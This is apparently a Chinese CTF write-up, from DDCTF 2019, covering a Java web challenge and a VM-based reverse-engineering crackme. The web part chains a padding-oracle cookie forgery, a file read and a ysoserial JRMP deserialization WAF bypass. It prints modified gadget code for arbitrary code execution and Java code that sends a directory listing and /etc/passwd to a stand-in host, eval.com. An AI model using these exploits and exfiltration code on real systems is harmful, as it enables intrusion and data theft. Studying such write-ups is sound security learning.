<p>&#x4F5C;&#x8005;&#xFF1A;<strong>5am3</strong><br>p.s.&#x538B;&#x8F74;&#x9898;&#x54C8;&#xFF0C;&#x8BF4;&#x5B9E;&#x8BDD;&#xFF0C;&#x8FD9;&#x9898;&#x771F;&#x7684;&#x5B66;&#x4F1A;&#x4E86;&#x4E0D;&#x5C11;&#x4E1C;&#x897F;&#x3002;&#x6BD5;&#x7ADF;&#x81EA;&#x5DF1;&#x592A;&#x83DC;&#x4E86;&#xFF0C;&#x867D;&#x7136;&#x672C;&#x79D1;&#x4E13;&#x4E1A;&#x4E3A;java&#x5F00;&#x53D1;&#x72D7;&#x3002;&#x4F46;&#x6211;&#x771F;&#x7684;&#x4E0D;&#x592A;&#x719F;&#x554A;...<br>&#x4E00;&#x5171;&#x5206;&#x4E3A;&#x4E09;&#x5173;&#x5427;&#x3002;  </p>
<ul>
<li>&#x9996;&#x5148;&#x662F;&#x4E00;&#x4E2A;PadOracle&#x653B;&#x51FB;&#xFF0C;&#x4F2A;&#x9020;cookie&#x3002;&#x8FD9;&#x4E2A;&#x89E3;&#x5BC6;Cookie&#x53EF;&#x4EE5;&#x770B;&#x5230;hint&#xFF1A; PadOracle:iv/cbc&#x3002;  </li>
<li>&#x7B2C;&#x4E8C;&#x5173;&#xFF0C;&#x8BFB;&#x6587;&#x4EF6;&#xFF0C;&#x770B;&#x5230;&#x540E;&#x7AEF;&#x4EE3;&#x7801;&#x540E;&#xFF0C;&#x624D;&#x53D1;&#x73B0;&#xFF0C;&#x8FD9;&#x91CC;&#x8D3C;&#x5751;&#x3002;  </li>
<li>&#x7B2C;&#x4E09;&#x5173;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;  </li>
</ul>
<p>&#x9996;&#x5148;&#x7B2C;&#x4E00;&#x5173;&#x597D;&#x8BF4;&#xFF0C;&#x5176;&#x5B9E;&#x5728;/api/account_info&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x62FF;&#x5230;&#x8FD4;&#x56DE;&#x7684;&#x660E;&#x6587;&#x4FE1;&#x606F;&#x3002;&#x7136;&#x540E;&#x901A;&#x8FC7;Padding Oracle + cbc&#x7FFB;&#x8F6C;&#x6765;&#x4F2A;&#x9020;cookie&#x5373;&#x53EF;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;&#x7F51;&#x4E0A;&#x5F88;&#x591A;&#x8D44;&#x6599;&#x3002;
&#x6700;&#x540E;&#x62FF;&#x5230;cookie&#xFF0C;&#x76F4;&#x63A5;&#x6D4F;&#x89C8;&#x5668;&#x5199;&#x5165;cookie&#x5C31;OK&#x3002;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x7684;&#x63A5;&#x53E3;&#x3002;</p>
<blockquote>
<p>/api/fileDownload?fileName=1.txt</p>
</blockquote>
<p>&#x867D;&#x7136;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x4F46;&#x662F;&#x8D3C;&#x5751;&#x3001;<br>&#x4E00;&#x987F;&#x64CD;&#x4F5C;&#x731B;&#x5982;&#x864E;&#xFF0C;&#x6700;&#x540E;&#x53EA;&#x8BFB;&#x51FA;/etc/passwd...  </p>
<p>&#x641C;&#x5230;&#x4E86;<a href="https://github.com/tdifg/payloads/blob/master/lfi.txt" target="_blank">&#x5F88;&#x591A;&#x5B57;&#x5178;</a>&#x3002;&#x7136;&#x540E;burp&#x7206;&#x7834;&#x4E00;&#x6CE2;&#xFF0C;&#x6700;&#x540E;&#x53D1;&#x73B0;/proc/self/fd/15&#x8FD9;&#x91CC;&#x6709;&#x4E1C;&#x897F;&#xFF0C;&#x770B;&#x5230;&#x719F;&#x6089;&#x7684;pk&#x5934;&#xFF0C;&#x60C5;&#x4E0D;&#x81EA;&#x7981;&#x7684;&#x7B11;&#x4E86;&#x8D77;&#x6765;&#x3002;&#xFF08;&#x5BF9;&#xFF0C;&#x5C31;&#x662F;&#x6E90;&#x7801;&#xFF09;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-54f65eac-6202-1.png" alt=""><br>&#x6E90;&#x7801;&#x4E5F;&#x4E0D;&#x591A;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x63A5;&#x53E3;&#x3002;<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014936-5527d2de-6202-1.png" alt=""><br>&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E4B;&#x524D;&#xFF0C;&#x8FD8;&#x8C03;&#x7528;&#x4E86;SerialKiller&#xFF0C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;waf&#xFF0C;&#x5BF9;&#x5E38;&#x89C1;payload&#x8FDB;&#x884C;&#x62E6;&#x622A;&#x3002;<br>&#x9996;&#x5148;&#x9898;&#x76EE;&#x7ED9;&#x4E86;hint&#xFF1A;JRMP&#x3002;&#x6839;&#x636E;&#x8FD9;&#x4E2A;hint&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x5F88;&#x591A;&#x8D44;&#x6599;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#x81EA;&#x5DF1;&#x7528;&#x7684;ysoserial&#xFF0C;&#x6839;&#x636E;&#x4ED6;&#x7684;JRMP&#x6A21;&#x5757;&#x6765;&#x8FDB;&#x884C;&#x4E0B;&#x4E00;&#x6B65;&#x64CD;&#x4F5C;&#x3002;<br>&#x5728;&#x8FD9;&#x91CC;&#xFF0C;JRMP&#x4E3B;&#x8981;&#x8D77;&#x4E86;&#x4E00;&#x4E2A;&#x7ED5;&#x8FC7;waf&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;waf&#x53EA;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;userinfo&#x65F6;&#x8FDB;&#x884C;&#x4E86;&#x8C03;&#x7528;&#x3002;&#x5F53;&#x901A;&#x8FC7;JRMP&#x6765;&#x8BFB;&#x53D6;payload&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#xFF0C;&#x4E0D;&#x4F1A;&#x8D70;waf&#x3002;<br>&#x9996;&#x5148;&#xFF0C;JRMP&#x8FD9;&#x4E2A;payload&#x88AB;waf&#x6389;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x5148;&#x77E5;&#x4E0A;&#x7684;&#x4E00;&#x79CD;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#x3002;  </p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2479" target="_blank">https://xz.aliyun.com/t/2479</a></p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-5555b226-6202-1.png" alt=""><br>&#x76F4;&#x63A5;&#x4FEE;&#x6539;ysoserial&#x6E90;&#x7801;&#x5373;&#x53EF;&#xFF0C;&#x5C06;&#x539F;&#x6709;&#x7684;JRMPClient&#x7684;payload&#x590D;&#x5236;&#x4E00;&#x4EFD;&#xFF0C;&#x6539;&#x540D;&#x4E3A;JRMPClient2&#xFF0C;&#x7136;&#x540E;&#x4FDD;&#x5B58;&#x5E76;&#x7F16;&#x8BD1;&#x3002;<br>&#x6B64;&#x65F6;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528;URLDNS&#x6A21;&#x5757;&#xFF0C;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x653B;&#x51FB;&#x6210;&#x529F;&#x3002;<br>&#x4FEE;&#x6539;&#x66FF;&#x6362;<br>&#x5F00;&#x542F;&#x76D1;&#x542C;&#x7AEF;&#x53E3;<br>&#x5EFA;&#x8BAE;&#x91C7;&#x7528;ceye&#x7684;dnslog&#x67E5;&#x770B;<br><code>java -cp ./ysoserial-5am3.jar ysoserial.exploit.JRMPListener {{port}} URLDNS {{http://eval.com}}</code><br>&#x751F;&#x6210;&#x94FE;&#x63A5;JRMPListener&#x7684;payload<br>ip&#x7AEF;&#x53E3;&#x90A3;&#x91CC;&#x586B;&#x5199;&#x8FD0;&#x884C;&#x7B2C;4&#x884C;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x673A;&#x5730;&#x5740;&#x7AEF;&#x53E3;<br><code>java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8119}} | base64</code><br>&#x6B64;&#x65F6;&#x5C06;&#x7B2C;10&#x884C;&#x751F;&#x6210;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x76F4;&#x63A5;&#x6253;&#x5230;&#x8FDC;&#x7A0B;&#x5373;&#x53EF;&#x3002;<br>&#x7136;&#x540E;&#x67E5;&#x770B;dnslog&#x4FE1;&#x606F;&#x3002;&#x53D1;&#x73B0;&#x5B58;&#x5728;&#xFF0C;&#x90A3;&#x5C31;&#x662F;ok&#x4E86;&#x3002;<br>&#x63A5;&#x4E0B;&#x6765;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x6362;payload&#x4E86;&#x3002;&#x6B64;&#x65F6;&#x8FD9;&#x91CC;&#x8FD8;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF01;&#xFF01;<br>&#x8FD9;&#x4E2A;&#x662F;hint&#x4E2D;&#x7ED9;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x627E;&#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF0C;&#x5982;&#xFF1A;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;<br>&#x67E5;&#x9605;&#x8D44;&#x6599;&#xFF0C;&#x53D1;&#x73B0;ysoserial&#x9884;&#x7559;&#x4E86;&#x8FD9;&#x5757;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x4FEE;&#x6539;&#x5373;&#x53EF;&#x3002;  </p>
<blockquote>
<p><a href="https://blog.csdn.net/fnmsd/article/details/79534877" target="_blank">https://blog.csdn.net/fnmsd/article/details/79534877</a></p>
</blockquote>
<p>&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5C1D;&#x8BD5;&#x53BB;&#x4FEE;&#x6539;ysoserial/payloads/util/Gadgets.java&#x4E2D;createTemplatesImpl&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;  </p>
<pre class="language-"><code>// createTemplatesImpl&#x4FEE;&#x6539;&#x7248;&#xFF0C;&#x652F;&#x6301;&#x4EE3;&#x7801;&#x6267;&#x884C;
public static <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">&gt;</span></span> T createTemplatesImpl ( final String command, Class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">&gt;</span></span> tplClass, Class<span class="token prolog">&lt;?&gt; abstTranslet, Class&lt;?&gt;</span> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
//        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
//            command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
//            &quot;\&quot;);&quot;;
        String cmd=&quot;&quot;;
        //&#x5982;&#x679C;&#x4EE5;code:&#x5F00;&#x5934;&#xFF0C;&#x8BA4;&#x4E3A;&#x662F;&#x4EE3;&#x7801;&#xFF0C;&#x5426;&#x5219;&#x8BA4;&#x4E3A;&#x662F;&#x547D;&#x4EE4;
        if(!command.startsWith(&quot;code:&quot;)){
            cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +
            command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +
            &quot;\&quot;);&quot;;
        }
        else{
            System.err.println(&quot;Java Code Mode:&quot;+command.substring(5));//&#x4F7F;&#x7528;stderr&#x8F93;&#x51FA;&#xFF0C;&#x9632;&#x6B62;&#x5F71;&#x54CD;payload&#x7684;&#x8F93;&#x51FA;
            cmd = command.substring(5);
        }
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName(&quot;ysoserial.Pwner&quot; + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, &quot;_name&quot;, &quot;Pwnr&quot;);
        Reflections.setFieldValue(templates, &quot;_tfactory&quot;, transFactory.newInstance());
        return templates;
    }
</code></pre><p>&#x6B64;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x7684;payload&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E86;&#x3002;<br>&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x662F;&#x76F4;&#x63A5;&#x7528;&#x672C;&#x5730;&#x7684;&#x9898;&#x76EE;&#x73AF;&#x5883;&#x8FDB;&#x884C;&#x8C03;&#x8BD5;&#xFF0C;&#x5C1D;&#x8BD5;&#x6253;&#x5370;&#x4E86;aaa,&#x64CD;&#x4F5C;&#x5982;&#x4E0B;&#x3002;<br>&#x4FEE;&#x6539;&#x66FF;&#x6362;<br>&#x5F00;&#x542F;&#x76D1;&#x542C;&#x7AEF;&#x53E3;<br>&#x5EFA;&#x8BAE;&#x91C7;&#x7528;ceye&#x7684;dnslog&#x67E5;&#x770B;<br>&#x6267;&#x884C;&#x65F6;&#x5408;&#x5E76;&#x4E3A;&#x4E00;&#x884C;&#xFF0C;&#x4E3A;&#x4E86;&#x597D;&#x770B;&#xFF0C;&#x6211;&#x6362;&#x4E86;&#x4E0B;&#x884C;  </p>
<pre class="language-"><code>java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
    CommonsBeanutils1 &apos;code:System.out.printld(&quot;aaa&quot;);&apos;
</code></pre><p>&#x751F;&#x6210;&#x94FE;&#x63A5;JRMPListener&#x7684;payload<br>ip&#x7AEF;&#x53E3;&#x90A3;&#x91CC;&#x586B;&#x5199;&#x8FD0;&#x884C;&#x7B2C;4&#x884C;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x673A;&#x5730;&#x5740;&#x7AEF;&#x53E3;<br><code>java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64</code>  </p>
<p>&#x6B64;&#x65F6;&#x5C06;&#x7B2C;10&#x884C;&#x751F;&#x6210;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x76F4;&#x63A5;&#x6253;&#x5230;&#x8FDC;&#x7A0B;&#x5373;&#x53EF;&#x3002;<br>&#x7136;&#x540E;&#x8FDB;&#x800C;&#x5199;&#x4E00;&#x4E0B;&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x83B7;&#x53D6;&#x76EE;&#x5F55;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x6B64;&#x65F6;&#x62FF;&#x5230;&#x6587;&#x4EF6;&#xFF0C;&#x65E0;&#x6CD5;&#x56DE;&#x663E;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528;Socket&#x6765;&#x5C06;&#x6587;&#x4EF6;&#x53D1;&#x9001;&#x5230;&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7136;&#x540E;nc&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x5373;&#x53EF;&#x3002;  </p>
<pre class="language-"><code>// &#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x8BB0;&#x5F97;&#x538B;&#x7F29;&#x5230;&#x4E00;&#x884C;&#x3002;
// &#x83B7;&#x53D6;&#x76EE;&#x5F55;&#x4E0B;&#x5185;&#x5BB9;
java.io.File file  =new java.io.File(&quot;/&quot;);
java.io.File[] fileLists = file.listFiles();
java.net.Socket s = new java.net.Socket(&quot;eval.com&quot;,8768);

for (int i = 0; i &lt; fileLists.length; i++) {
  java.io.OutputStream out = s.getOutputStream();
  out.write(fileLists[i].getName().getBytes());
  out.write(&quot;\n&quot;.getBytes());
}

// &#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x5185;&#x5BB9;
java.io.File file = new java.io.File(&quot;/etc/passwd&quot;);
java.io.InputStream in = null;
in = new java.io.FileInputStream(file);
int tempbyte;
java.net.Socket s = new java.net.Socket(&quot;eval.com&quot;,8768);
while ((tempbyte = in.read()) != -1) {
  java.io.OutputStream out = s.getOutputStream();
  out.write(tempbyte);
}
in.close();
s.close();
</code></pre><p>&#x7136;&#x540E;&#x64CD;&#x4F5C;&#x5982;&#x4E0B;&#xFF1A;<br>&#x4FEE;&#x6539;&#x66FF;&#x6362;<br>&#x5F00;&#x542F;&#x76D1;&#x542C;&#x7AEF;&#x53E3;<br>&#x5EFA;&#x8BAE;&#x91C7;&#x7528;ceye&#x7684;dnslog&#x67E5;&#x770B;<br>&#x6267;&#x884C;&#x65F6;&#x5408;&#x5E76;&#x4E3A;&#x4E00;&#x884C;&#xFF0C;&#x4E3A;&#x4E86;&#x597D;&#x770B;&#xFF0C;&#x6211;&#x6362;&#x4E86;&#x4E0B;&#x884C;  </p>
<pre class="language-"><code>java -cp ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 
    CommonsBeanutils1 &apos;code:{{javapayload}}&apos;
</code></pre><h1 id="&#x751F;&#x6210;&#x94FE;&#x63A5;jrmplistener&#x7684;payload"><a name="&#x751F;&#x6210;&#x94FE;&#x63A5;jrmplistener&#x7684;payload" class="anchor-navigation-ex-anchor" href="#&#x751F;&#x6210;&#x94FE;&#x63A5;jrmplistener&#x7684;payload"><i class="fa fa-link" aria-hidden="true"></i></a>2. &#x751F;&#x6210;&#x94FE;&#x63A5;JRMPListener&#x7684;payload</h1>
<p>ip&#x7AEF;&#x53E3;&#x90A3;&#x91CC;&#x586B;&#x5199;&#x8FD0;&#x884C;&#x7B2C;4&#x884C;&#x811A;&#x672C;&#x7684;&#x4E3B;&#x673A;&#x5730;&#x5740;&#x7AEF;&#x53E3;<br><code>java -jar ./ysoserial-5am3.jar JRMPClient2 {{10.0.0.1:8099}} | base64</code><br>&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x6570;&#x636E;</p>
<blockquote>
<p>nc -lnvp 2333</p>
</blockquote>
<p>&#x6B64;&#x65F6;&#x5C06;&#x7B2C;10&#x884C;&#x751F;&#x6210;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x76F4;&#x63A5;&#x6253;&#x5230;&#x8FDC;&#x7A0B;&#x5373;&#x53EF;&#x3002;
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-556bf6f8-6202-1.png" alt=""><br>p.s. /flag&#x662F;&#x4E2A;&#x6587;&#x4EF6;&#x5939;</p>
<h2 id="reverse"><a name="reverse" class="anchor-navigation-ex-anchor" href="#reverse"><i class="fa fa-link" aria-hidden="true"></i></a>2.1. Reverse</h2>
<p><strong>&#x4F5C;&#x8005;&#xFF1A;admin-&#x7434;&#x91CC;&#x3001;impakho</strong></p>
<h3 id="cofused"><a name="cofused" class="anchor-navigation-ex-anchor" href="#cofused"><i class="fa fa-link" aria-hidden="true"></i></a>2.1.1. Cofused</h3>
<p><img src="https://i.loli.net/2019/04/18/5cb8331aa6140.png" alt=""><br>&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#x662F;app&#x7684;&#x5B89;&#x88C5;&#x5305;<br>&#x7136;&#x540E;&#x518D;&#x5B89;&#x88C5;&#x5305;&#x91CC;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x53EB;xia0Crackme&#x6587;&#x4EF6;<br><img src="https://i.loli.net/2019/04/18/5cb833314bf25.png" alt=""><br>&#x7136;&#x540E;&#x6211;&#x4EEC;&#x62D6;&#x5230;IDA&#x91CC;&#x9762;<br>&#x67E5;&#x627E;&#x5B57;&#x7B26;&#x4E32;<br><img src="https://i.loli.net/2019/04/18/5cb8335ad772a.png" alt=""><br>&#x4EA4;&#x53C9;&#x5F15;&#x7528;&#x6765;&#x5230;&#x5173;&#x952E;&#x51FD;&#x6570;<br><img src="https://i.loli.net/2019/04/18/5cb8337af011c.png" alt=""><br>&#x51FD;&#x6570;&#x90FD;&#x6807;&#x6709;&#x6CE8;&#x91CA;&#xFF08;&#x9707;&#x60CA;&#xFF01;&#x51FA;&#x9898;&#x4EBA;&#x679C;&#x7136;&#x662F;&#x4E00;&#x4E2A;&#x826F;&#x597D;&#x7684;&#x5927;&#x4F6C;&#xFF09;<br>&#x7A0B;&#x5E8F;&#x9A8C;&#x8BC1;&#x4E86;&#x524D;&#x516D;&#x4F4D;&#x662F;&#x4E0D;&#x662F;&#x201D;DDCTF{&#x201C;<br>&#x4EE5;&#x662F;&#x4E0D;&#x662F;&#x201D;}&#x201D;<br>&#x7136;&#x540E;&#x628A;&#x4E2D;&#x95F4;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5F53;&#x505A;&#x53C2;&#x6570;&#x4F20;&#x5230;sub_1000011D0&#x51FD;&#x6570;&#x91CC;<br>&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x7B49;&#x4E8E;1&#x7684;&#x8BDD;<br>&#x8FD9;&#x4E2A;flag&#x5219;&#x6B63;&#x786E;  </p>
<p>&#x7136;&#x540E;sub_1000011D0&#x51FD;&#x6570;&#x4E2D;&#x9996;&#x5148;&#x662F;&#x521D;&#x59CB;&#x5316;&#x4E86;&#x4E00;&#x4E2A;&#x533A;&#x57DF;&#xFF1A;v2<br><img src="https://i.loli.net/2019/04/18/5cb833aadf7a9.png" alt=""><br>Sub_100001f60&#x662F;&#x901A;&#x8FC7;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x548C;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5BF9;v2&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb833c452fe9.png" alt=""><br>&#x524D;&#x6BB5;&#x662F;&#x5BF9;v2&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x62F7;&#x8D1D;&#x5230;qword_100003F58+48&#x7684;&#x4F4D;&#x7F6E;  </p>
<p>sub_100001F00&#x51FD;&#x6570;&#x5BF9;(*v2+24)&#x8FDB;&#x884C;&#x8D4B;&#x503C;&#x628A;&#x4E00;&#x6BB5;&#x6570;&#x636E;&#x8D4B;&#x7ED9;&#x4E86;&#x4ED6;&#xFF0C;&#x7136;&#x540E;&#x662F;&#x4E00;&#x4E2A;&#x5FAA;&#x73AF;&#x5224;&#x65AD;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x521A;&#x521A;&#x8D4B;&#x503C;&#x7684;&#x6570;&#x636E;&#x662F;&#x4E0D;&#x662F;&#x7B49;&#x4E8E;&#x201C;0xf3&#x201D;
&#x7136;&#x540E;&#x6211;&#x4EEC;&#x8FDB;&#x5165;sub_100001E50&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x662F;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x7684;vm&#x7684;&#x5206;&#x652F;  </p>
<p><img src="https://i.loli.net/2019/04/18/5cb833ffb2006.png" alt=""><br>&#x8DF3;&#x8F6C;&#x7684;&#x5206;&#x652F;&#x5C31;&#x662F;&#x521A;&#x521A;&#x7ED9;v2&#x8D4B;&#x503C;&#x7684;&#x51FD;&#x6570;&#x5730;&#x5740;  </p>
<p>sub_100001D70&#xFF1A;&#x76F8;&#x5F53;&#x4E8E;&#x7ED9;&#x4E00;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x8D4B;&#x503C;&#x7684;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb83428a538d.png" alt=""><br>&#x7136;&#x540E;sub_100001A60&#xFF1A;&#x5F02;&#x6216;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb83500730e3.png" alt=""><br>ub_100001AA0&#xFF1A;&#x5BF9;&#x64CD;&#x4F5C;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x548C;&#x8F93;&#x5165;&#x7684;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;<br>sub_100001CB0&#xFF1A;&#x52A0;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb83428a538d.png" alt=""><br>sub_100001CF0&#xFF1A;&#x51CF;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb8356e0f8f1.png" alt=""><br>sub_100001B10:&#x8BBE;&#x7F6E;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6B63;&#x786E;&#x6807;&#x5FD7;&#x4F4D;<br><img src="https://i.loli.net/2019/04/18/5cb8356e20d1e.png" alt=""><br>sub_100001D30&#xFF1A;&#x8D4B;&#x503C;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb8356e21a8d.png" alt=""></p>
<p>sub_100001C60&#xFF1A;&#x5BF9;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;<br><img src="https://i.loli.net/2019/04/18/5cb8356e2209f.png" alt=""><br>&#x4E24;&#x79CD;&#x8FD0;&#x7B97;:<code>A&#xFF5E;Z</code>&#x548C;<code>a&#xFF5E;z</code><br><img src="https://i.loli.net/2019/04/18/5cb8356e2b276.png" alt=""><br>&#x5177;&#x4F53;&#x6570;&#x636E;&#xFF1A;  </p>
<pre class="language-"><code>0xf0,0x10,0x66,0x0,0x0,0x0,
0xf8,
0xf2,0x30,
0xf6,0xc1,

0xf0,0x10,0x63,0x0,0x0,0x0,
0xf8,
0xf2,0x31,
0xf6,0xb6,

0xf0,0x10,0x6a,0x0,0x0,0x0,
0xf8,
0xf2,0x32,
0xf6,0xab,

0xf0,0x10,0x6a,0x0,0x0,0x0,
0xf8,
0xf2,0x33,
0xf6,0xa0,

0xf0,0x10,0x6d,0x0,0x0,0x0,
0xf8,
0xf2,0x34,
0xf6,0x95,

0xf0,0x10,0x57,0x0,0x0,0x0,
0xf8,
0xf2,0x35,
0xf6,0x8a,

0xf0,0x10,0x6d,0x0,0x0,0x0,
0xf8,
0xf2,0x36,
0xf6,0x7f,

0xf0,0x10,0x73,0x0,0x0,0x0,
0xf8,
0xf2,0x37,
0xf6,0x74,

0xf0,0x10,0x45,0x0,0x0,0x0,
0xf8,
0xf2,0x38,
0xf6,0x69,

0xf0,0x10,0x6d,0x0,0x0,0x0,
0xf8,
0xf2,0x39,
0xf6,0x5e,

0xf0,0x10,0x72,0x0,0x0,0x0,
0xf8,
0xf2,0x3a,
0xf6,0x53,

0xf0,0x10,0x52,0x0,0x0,0x0,
0xf8,
0xf2,0x3b,
0xf6,0x48,

0xf0,0x10,0x66,0x0,0x0,0x0,
0xf8,
0xf2,0x3c,
0xf6,0x3d,

0xf0,0x10,0x63,0x0,0x0,0x0,
0xf8,
0xf2,0x3d,
0xf6,0x32,

0xf0,0x10,0x44,0x0,0x0,0x0,
0xf8,
0xf2,0x3e,
0xf6,0x27,

0xf0,0x10,0x6a,0x0,0x0,0x0,
0xf8,
0xf2,0x3f,
0xf6,0x1c,

0xf0,0x10,0x79,0x0,0x0,0x0,
0xf8,
0xf2,0x40,
0xf6,0x11,

0xf0,0x10,0x65,0x0,0x0,0x0,
0xf8,
0xf2,0x41,
0xf6,0x6,
0xf7,0x1,0x0,0x0,0x0,0xf3
</code></pre><p>&#x6700;&#x540E;&#x53EF;&#x4EE5;&#x5F97;&#x5230;flag&#xFF1A;<code>hello******TheFlag</code></p>
